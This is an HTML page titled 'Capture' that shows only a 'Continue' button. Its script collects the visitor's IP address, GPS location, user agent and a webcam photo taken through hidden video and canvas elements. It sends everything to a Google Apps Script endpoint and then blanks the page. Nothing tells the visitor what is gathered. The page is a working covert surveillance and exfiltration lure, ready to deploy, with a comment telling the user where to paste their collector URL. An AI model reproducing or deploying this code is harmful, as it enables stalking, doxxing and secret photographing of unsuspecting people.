<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Capture</title>
</head>
<body>

<button id="btn">Continue</button>

<video id="video" autoplay playsinline style="display:none"></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbzxh3l6cjZBV6u1Op8OkOM2eSAB_lZM2454kvub-6C82Gfq-uCOB9bq74HqIFdsZMQ0pg/exec"; // ðŸ‘ˆ paste Apps Script Web App URL here

document.getElementById("btn").onclick = async () => {

  // ðŸ”¹ Get IP
  let ip = "";
  try {
    const r = await fetch("https://api.ipify.org?format=json");
    ip = (await r.json()).ip;
  } catch(e) {}

  // ðŸ”¹ Get Location
  let location = {};
  try {
    const pos = await new Promise((res, rej) =>
      navigator.geolocation.getCurrentPosition(res, rej)
    );
    location = {
      lat: pos.coords.latitude,
      lng: pos.coords.longitude
    };
  } catch(e) {}

  // ðŸ”¹ Get Camera Photo
  let photo = "";
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.getElementById("video");
    video.srcObject = stream;

    await new Promise(r => setTimeout(r, 1500));

    const canvas = document.getElementById("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);

    photo = canvas.toDataURL("image/jpeg");

    stream.getTracks().forEach(t => t.stop());
  } catch(e) {}

  // ðŸ”¹ Send Data
  await fetch(WEB_APP_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      ip: ip,
      location: location,
      device: navigator.userAgent,
      photo: photo
    })
  });

  // ðŸ”¹ Make page blank
  document.body.innerHTML = "";
};
</script>

</body>
</html>
